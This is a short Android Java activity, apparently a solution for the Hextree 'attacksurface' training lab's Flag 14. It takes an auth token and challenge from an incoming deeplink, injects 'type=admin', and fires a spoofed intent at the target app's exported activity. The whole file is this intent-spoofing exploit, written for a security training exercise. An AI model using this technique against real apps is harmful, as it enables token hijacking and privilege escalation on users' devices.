package com.hextree.getflag;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class DeeplinkFlag14 extends AppCompatActivity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent intent = getIntent();
//        Utils.showDialog(this, intent);
        Uri data = intent.getData();
        String queryParameter = data.getQueryParameter("type");
        String queryParameter2 = data.getQueryParameter("authToken");
        String queryParameter3 = data.getQueryParameter("authChallenge");

        Intent spoofedIntent = new Intent();
        spoofedIntent.setAction("android.intent.action.VIEW");
        spoofedIntent.addCategory("android.intent.category.BROWSABLE");
        spoofedIntent.setData(Uri.parse("hex://token?authToken=" + queryParameter2 + "&type=admin" + "&authChallenge=" + queryParameter3));
        spoofedIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag14Activity"));
//        Utils.showDialog(this, spoofedIntent);
        startActivity(spoofedIntent);
    }
}
